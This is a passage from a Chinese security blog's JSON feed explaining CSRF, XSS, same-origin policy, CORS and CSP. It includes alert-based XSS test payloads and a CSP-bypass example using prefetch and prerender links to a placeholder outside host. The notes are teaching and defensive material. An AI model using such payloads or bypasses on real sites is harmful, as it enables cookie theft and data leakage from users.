登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。</p>\n<h2 id=\"xmlhttprequest\"><a class=\"anchor\" href=\"#xmlhttprequest\">#</a> XMLHttpRequest</h2>\n<p>XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。</p>\n<p>基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。</p>\n<p>这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。</p>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>通过 CSRF-token 或者验证码来检测用户提交</li>\n<li>验证 Referer/Content-Type</li>\n<li>对于用户修改删除等操作最好都使用 POST 操作</li>\n<li>避免全站通用的 Cookie，严格设置 Cookie 的域</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ2l0aHViLmNvbS9qcm96bmVyL2NzcmYtZGVtbw==\">demo</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=\">Wiping Out CSRF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvMGFuZzNlbC9uZWF0LXRyaWNrcy10by1ieXBhc3MtY3NyZnByb3RlY3Rpb24=\">Neat tricks to bypass CSRF protection</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "CSRF"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "title": "XSS",
            "date_published": "2022-11-26T03:55:09.000Z",
            "content_html": "<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。</p>\n<h2 id=\"反射型xss\"><a class=\"anchor\" href=\"#反射型xss\">#</a> 反射型 XSS</h2>\n<p>反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： <code>&lt;?php echo &quot;&lt;p&gt;hello, $_GET['user']&lt;/p&gt;&quot;;?&gt;</code>  ，那么在访问时设置  <code>/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</code>  ，则可执行预设好的 JavaScript 代码。</p>\n<p>反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。</p>\n<h2 id=\"储存型xss\"><a class=\"anchor\" href=\"#储存型xss\">#</a> 储存型 XSS</h2>\n<p>储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>\n<h2 id=\"dom-xss\"><a class=\"anchor\" href=\"#dom-xss\">#</a> DOM XSS</h2>\n<p>DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。</p>\n<p>例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>DOM Based XSS Demo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"output\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;img src='\"</span><span class=\"token operator\">+</span>str<span class=\"token operator\">+</span><span class=\"token string\">\"'>&lt;/img>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>output<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>input<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>50</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>输入  <code>x' onerror='javascript:alert(/xss/)</code>  即可触发。</p>\n<h2 id=\"blind-xss\"><a class=\"anchor\" href=\"#blind-xss\">#</a> Blind XSS</h2>\n<p>Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。</p>\n<h1 id=\"危害\"><a class=\"anchor\" href=\"#危害\">#</a> 危害</h1>\n<p>存在 XSS 漏洞时，可能会导致以下几种情况：</p>\n<ol>\n<li>用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。</li>\n<li>攻击者能够在一定限度内记录用户的键盘输入。</li>\n<li>攻击者通过 CSRF 等方式以用户身份执行危险操作。</li>\n<li>XSS 蠕虫。</li>\n<li>获取用户浏览器信息。</li>\n<li>利用 XSS 漏洞扫描用户内网。</li>\n</ol>\n<h1 id=\"同源策略\"><a class=\"anchor\" href=\"#同源策略\">#</a> 同源策略</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。</p>\n<h3 id=\"file域的同源策略\"><a class=\"anchor\" href=\"#file域的同源策略\">#</a> file 域的同源策略</h3>\n<p>在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。</p>\n<p>从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>\n<h3 id=\"cookie的同源策略\"><a class=\"anchor\" href=\"#cookie的同源策略\">#</a> cookie 的同源策略</h3>\n<p>cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。</p>\n<p>不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  <code>domain</code>  /  <code>path</code>  /  <code>secure</code>  和  <code>http-only</code>  标记来限定其访问性。</p>\n<p>所以  <code>https://localhost:8080/</code>  和  <code>http://localhost:8081/</code>  的 Cookie 是共享的。</p>\n<h3 id=\"flashsilverlight跨域\"><a class=\"anchor\" href=\"#flashsilverlight跨域\">#</a> Flash/SilverLight 跨域</h3>\n<p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>\n<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>\n<h2 id=\"源的更改\"><a class=\"anchor\" href=\"#源的更改\">#</a> 源的更改</h2>\n<p>同源策略认为域和子域属于不同的域，例如  <code>child1.a.com</code>  与  <code>a.com</code>  /  <code>child1.a.com</code>  与  <code>child2.a.com</code>  /  <code>xxx.child1.a.com</code>  与  <code>child1.a.com</code>  两两不同源。</p>\n<p>对于这种情况，可以在两个方面各自设置  <code>document.domain='a.com'</code>  来改变其源来实现以上任意两个页面之间的通信。</p>\n<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  <code>null</code>  。</p>\n<h2 id=\"跨源访问\"><a class=\"anchor\" href=\"#跨源访问\">#</a> 跨源访问</h2>\n<p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>\n<ul>\n<li>通常允许跨域写操作 (Cross-origin writes)\n<ul>\n<li>链接 (links)</li>\n<li>重定向</li>\n<li>表单提交</li>\n</ul>\n</li>\n<li>通常允许跨域资源嵌入 (Cross-origin embedding)</li>\n<li>通常不允许跨域读操作 (Cross-origin reads)</li>\n</ul>\n<p>可能嵌入跨源的资源的一些示例有：</p>\n<ul>\n<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>\n<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。</li>\n<li><code>&lt;img&gt;</code>  /  <code>&lt;video&gt;</code>  /  <code>&lt;audio&gt;</code>  嵌入多媒体资源。</li>\n<li><code>&lt;object&gt;</code>   <code>&lt;embed&gt;</code>  和  <code>&lt;applet&gt;</code>  的插件。</li>\n<li><code>@font-face</code>  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。</li>\n<li><code>&lt;frame&gt;</code>  和  <code>&lt;iframe&gt;</code>  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</li>\n</ul>\n<h3 id=\"jsonp跨域\"><a class=\"anchor\" href=\"#jsonp跨域\">#</a> JSONP 跨域</h3>\n<p>JSONP 就是利用  <code>&lt;script&gt;</code>  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。</p>\n<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。</p>\n<p>JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。</p>\n<p>另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。</p>\n<h3 id=\"跨源脚本api访问\"><a class=\"anchor\" href=\"#跨源脚本api访问\">#</a> 跨源脚本 API 访问</h3>\n<p>Javascript 的 APIs 中，如  <code>iframe.contentWindow</code>  ,  <code>window.parent</code> ,  <code>window.open</code>  和  <code>window.opener</code>  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  <code>window</code>  和  <code>location</code>  对象的访问添加限制。</p>\n<p><code>window</code>  允许跨源访问的方法有</p>\n<ul>\n<li>window.blur</li>\n<li>window.close</li>\n<li>window.focus</li>\n<li>window.postMessage</li>\n</ul>\n<p><code>window</code>  允许跨源访问的属性有</p>\n<ul>\n<li>window.closed</li>\n<li>window.frames</li>\n<li>window.length</li>\n<li>window.location</li>\n<li>window.opener</li>\n<li>window.parent</li>\n<li>window.self</li>\n<li>window.top</li>\n<li>window.window</li>\n</ul>\n<p>其中  <code>window.location</code>  允许读 / 写，其他的属性只允许读</p>\n<h3 id=\"跨源数据存储访问\"><a class=\"anchor\" href=\"#跨源数据存储访问\">#</a> 跨源数据存储访问</h3>\n<p>存储在浏览器中的数据，如  <code>localStorage</code>  和  <code>IndexedDB</code> ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。</p>\n<h2 id=\"cors\"><a class=\"anchor\" href=\"#cors\">#</a> CORS</h2>\n<p>CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>\n<h3 id=\"常见请求头\"><a class=\"anchor\" href=\"#常见请求头\">#</a> 常见请求头</h3>\n<ul>\n<li>Origin\n<ul>\n<li>预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段</li>\n<li><code>Origin: &lt;origin&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Method\n<ul>\n<li>声明请求使用的方法</li>\n<li><code>Access-Control-Request-Method: &lt;method&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Headers\n<ul>\n<li>声明请求使用的 header 字段</li>\n<li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"常见返回头\"><a class=\"anchor\" href=\"#常见返回头\">#</a> 常见返回头</h3>\n<ul>\n<li>Access-Control-Allow-Origin\n<ul>\n<li>声明允许访问的源外域 URI</li>\n<li>对于携带身份凭证的请求不可使用通配符</li>\n<li><code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></li>\n</ul>\n</li>\n<li>Access-Control-Expose-Headers\n<ul>\n<li>声明允许暴露的头</li>\n<li>e.g.  <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></li>\n</ul>\n</li>\n<li>Access-Control-Max-Age\n<ul>\n<li>声明 Cache 时间</li>\n<li><code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Credentials\n<ul>\n<li>声明是否允许在请求中带入</li>\n<li><code>Access-Control-Allow-Credentials: true</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Methods\n<ul>\n<li>声明允许的访问方式</li>\n<li><code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Headers\n<ul>\n<li>声明允许的头</li>\n<li><code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"防御建议\"><a class=\"anchor\" href=\"#防御建议\">#</a> 防御建议</h3>\n<ul>\n<li>如非必要不开启 CORS</li>\n<li>定义详细的白名单，不使用通配符，仅配置所需要的头</li>\n<li>配置  <code>Vary: Origin</code>  头部</li>\n<li>如非必要不使用  <code>Access-Control-Allow-Credentials</code></li>\n<li>限制缓存的时间</li>\n</ul>\n<h2 id=\"阻止跨源访问\"><a class=\"anchor\" href=\"#阻止跨源访问\">#</a> 阻止跨源访问</h2>\n<p>阻止跨域写操作，可以检测请求中的  <code>CSRF token</code>  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。</p>\n<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  <code>Content-Type</code>  消息头。例如如果在 HTML 文档中指定  <code>&lt;script&gt;</code>  标记，则浏览器会尝试将 HTML 解析为 JavaScript。</p>\n<h1 id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> CSP</h1>\n<h2 id=\"csp是什么\"><a class=\"anchor\" href=\"#csp是什么\">#</a> CSP 是什么？</h2>\n<p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>\n<h2 id=\"配置\"><a class=\"anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。</p>\n<p>CSP 有三类：</p>\n<ul>\n<li>Content-Security-Policy (Google Chrome)</li>\n<li>X-Content-Security-Policy (Firefox)</li>\n<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>\n</ul>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HTTP header :</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\"Content-Security-Policy:\" 策略</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\"Content-Security-Policy-Report-Only:\" 策略</pre></td></tr></table></figure><p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>\n<p>HTML Meta :</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy-report-only<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"指令说明\"><a class=\"anchor\" href=\"#指令说明\">#</a> 指令说明</h3>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>default-src</td>\n<td>定义资源默认加载策略</td>\n</tr>\n<tr>\n<td>connect-src</td>\n<td>定义 Ajax、WebSocket 等加载策略</td>\n</tr>\n<tr>\n<td>font-src</td>\n<td>定义 Font 加载策略</td>\n</tr>\n<tr>\n<td>frame-src</td>\n<td>定义 Frame 加载策略</td>\n</tr>\n<tr>\n<td>img-src</td>\n<td>定义图片加载策略</td>\n</tr>\n<tr>\n<td>media-src</td>\n<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>object-src</td>\n<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>script-src</td>\n<td>定义 JS 加载策略</td>\n</tr>\n<tr>\n<td>style-src</td>\n<td>定义 CSS 加载策略</td>\n</tr>\n<tr>\n<td>base-uri</td>\n<td>定义 &lt;base&gt; 根 URL 策略，不使用 default-src 作为默认值</td>\n</tr>\n<tr>\n<td>sandbox</td>\n<td>值为 allow-forms，对资源启用 sandbox</td>\n</tr>\n<tr>\n<td>report-uri</td>\n<td>值为 /report-uri，提交日志</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"关键字\"><a class=\"anchor\" href=\"#关键字\">#</a> 关键字</h3>\n<ul>\n<li><code>-</code>\n<ul>\n<li>允许从任意 url 加载，除了  <code>data:</code>   <code>blob:</code>   <code>filesystem:</code>   <code>schemes</code></li>\n<li>e.g.  <code>img-src -</code></li>\n</ul>\n</li>\n<li><code>none</code>\n<ul>\n<li>禁止从任何 url 加载资源</li>\n<li>e.g.  <code>object-src 'none'</code></li>\n</ul>\n</li>\n<li><code>self</code>\n<ul>\n<li>只可以加载同源资源</li>\n<li>e.g.  <code>img-src 'self'</code></li>\n</ul>\n</li>\n<li><code>data:</code>\n<ul>\n<li>可以通过 data 协议加载资源</li>\n<li>e.g.  <code>img-src 'self' data:</code></li>\n</ul>\n</li>\n<li><code>domain.example.com</code>\n<ul>\n<li>e.g.  <code>img-src domain.example.com</code></li>\n<li>只可以从特定的域加载资源</li>\n</ul>\n</li>\n<li><code>\\*.example.com</code>\n<ul>\n<li>e.g.  <code>img-src \\*.example.com</code></li>\n<li>可以从任意 example.com 的子域处加载资源</li>\n</ul>\n</li>\n<li><code>https://cdn.com</code>\n<ul>\n<li>e.g.  <code>img-src https://cdn.com</code></li>\n<li>只能从给定的域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>https:</code>\n<ul>\n<li>e.g.  <code>img-src https:</code></li>\n<li>只能从任意域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>unsafe-inline</code>\n<ul>\n<li>允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签</li>\n<li>e.g.  <code>script-src 'unsafe-inline'</code></li>\n</ul>\n</li>\n<li><code>unsafe-eval</code>\n<ul>\n<li>允许一些不安全的代码执行方式，例如 js 的 eval ()</li>\n<li>e.g.  <code>script-src 'unsafe-eval'</code></li>\n</ul>\n</li>\n<li><code>nonce-&lt;base64-value&gt;'</code>\n<ul>\n<li>使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签</li>\n<li>e.g.  <code>script-src 'nonce-bm9uY2U='</code></li>\n</ul>\n</li>\n<li><code>&lt;hash-algo&gt;-&lt;base64-value&gt;'</code>\n<ul>\n<li>允许 hash 值匹配的代码块被执行</li>\n<li>e.g.  <code>script-src 'sha256-&lt;base64-value&gt;'</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"配置范例\"><a class=\"anchor\" href=\"#配置范例\">#</a> 配置范例</h3>\n<p>允许执行内联 JS 代码，但不允许加载外部资源</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'unsafe-inline'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<h3 id=\"预加载\"><a class=\"anchor\" href=\"#预加载\">#</a> 预加载</h3>\n<p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>\n<p>HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个页面 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- firefox --></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prerender<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个图片 --></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx/x.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">&lt;!-- DNS 预解析 --></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>dns-prefetch<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xxxx<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">&lt;!-- 特定文件类型预加载 --></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token 